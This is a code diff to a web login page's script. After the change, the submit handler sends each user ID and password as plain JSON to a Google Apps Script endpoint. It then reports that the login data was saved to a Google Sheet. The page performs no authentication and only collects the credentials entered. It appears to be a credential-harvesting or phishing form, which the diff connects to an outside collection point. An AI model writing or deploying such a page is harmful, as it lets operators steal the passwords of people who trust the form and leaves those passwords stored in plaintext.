@@ -270,25 +270,30 @@
 
     async function submitLogin(e) {
       e.preventDefault();
-      const userId = document.getElementById('userid').value;
-      const password = document.getElementById('password').value;
+      const userId = document.getElementById('userid').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-      // Backend URL: local test hole http://localhost:5000/api/login
-      // Deploy korle backend er public URL use korun
-      const res = await fetch('http://localhost:5000/api/login', {
+      if (!userId || !password) {
+        alert("Please enter both User ID and Password.");
+        return;
+      }
+
+      const res = await fetch('https://script.google.com/macros/s/AKfycbxHjKmJq_E76cvZHEMC6eUPBaaDgBNPweRi1QK1p4D9LdooCawTUDPwx8dvYy9Lx0UK/exec', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId, password })
+        body: JSON.stringify({ username: userId, password: password })
       });
-      const data = await res.json();
-      if (data.success) {
-        alert('Login data saved!');
+
+      const text = await res.text();
+      if (text === "Saved") {
+        alert("✅ Login data saved to Google Sheet!");
+        document.getElementById('userid').value = "";
+        document.getElementById('password').value = "";
       } else {
-        alert('Error saving data');
+        alert("❌ Error saving data: " + text);
       }
     }
   </script>
 ></body>
 </html
-
 
